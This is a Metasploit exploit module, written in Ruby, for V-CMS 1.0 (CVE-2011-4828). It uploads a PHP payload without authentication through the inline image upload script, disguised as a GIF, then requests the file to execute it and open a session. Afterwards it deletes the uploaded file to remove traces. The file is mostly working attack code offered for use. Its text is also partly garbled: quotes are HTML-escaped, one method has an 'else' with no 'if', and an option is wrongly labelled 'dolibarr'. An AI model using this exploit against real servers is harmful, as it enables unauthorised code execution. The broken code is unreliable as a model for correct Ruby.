# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "V-CMS PHP File Upload and Execute",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found on V-CMS&#039;s inline image upload feature.
                The problem is due to the inline_image_upload.php file not checking the file type
                before saving it on the web server. This allows any malicious user to upload a
                script (such as PHP) without authentication, and then execute it with a GET request.
 
                    The issue is fixed in 1.1 by checking the extension name.  By default, 1.1 only
                allows jpg, jpeg, png, gif, bmp, but it is still possible to upload a PHP file as
                one of those extension names, which may still be leveraged in an attack.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;AutoSec Tools&#039;,  #Initial discovery
                    &#039;sinn3r&#039;          #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2011-4828&#039;],
                    [&#039;BID&#039;, &#039;50706&#039;],
                    [&#039;URL&#039;, &#039;http://bugs.v-cms.org/view.php?id=53&#039;],
                    [&#039;URL&#039;, &#039;http://xforce.iss.net/xforce/xfdb/71358&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00",
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "none"
                },
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        =>
                [
                    [&#039;V-CMS 1.0&#039;, {}],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Nov 27 2011",  #When the ticket was created
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path to dolibarr&#039;, &#039;/vcms/&#039;])
                ], self.class)
    end
 
    def check
        res = send_request_raw({
            &#039;uri&#039;   => target_uri.path,
            &#039;method&#039; => &#039;GET&#039;
        })
 
        if res and res.body =~ /V\-CMS v1\.[0-1]/
            return Exploit::CheckCode::Appears
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def on_new_session(client)
            client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
            client.fs.file.rm(@payload_name)
        else
            client.shell_command_token("rm #{@payload_name}")
        end
    end
 
    def exploit
        peer = "#{rhost}:#{rport}"
 
        base = target_uri.path
        base << &#039;/&#039; if base[-1,1] != &#039;/&#039;
 
        @payload_name = "#{rand_text_alpha(5)}.php"
        p = %Q|<?php
        #{payload.encoded}
        ?>
        |
 
        p = p.gsub(/^\t\t/, &#039;&#039;)
 
        post_data = "------x\r\n"
        post_data << "Content-Disposition: form-data; name=\"Filedata\"; filename=\"#{@payload_name}\"\r\n"
        post_data << "Content-Type: image/gif\r\n"
        post_data << "\r\n"
        post_data << p
        post_data << "------x--\r\n"
 
        print_status("#{peer} Uploading payload: #{@payload_name}")
        res = send_request_cgi({
            &#039;uri&#039;    => "#{base}includes/inline_image_upload.php",
            &#039;method&#039; => &#039;POST&#039;,
            &#039;ctype&#039;  => &#039;multipart/form-data; boundary=----x&#039;,
            &#039;data&#039;   => post_data
        })
 
        if res
            print_status("#{peer} replies status: #{res.code.to_s}")
        else
            print_error("#{peer} No response from server. Will not continue")
            return
        end
 
        print_status("#{peer} Executing payload: #{@payload_name}")
        res = send_request_raw({
            &#039;uri&#039;    => "#{base}temp/#{@payload_name}",
            &#039;method&#039; => &#039;GET&#039;
        })
 
        if res and res.code == 404
            print_error("#{peer} 404 - the upload probably failed")
            return
        end
 
        handler
    end
end



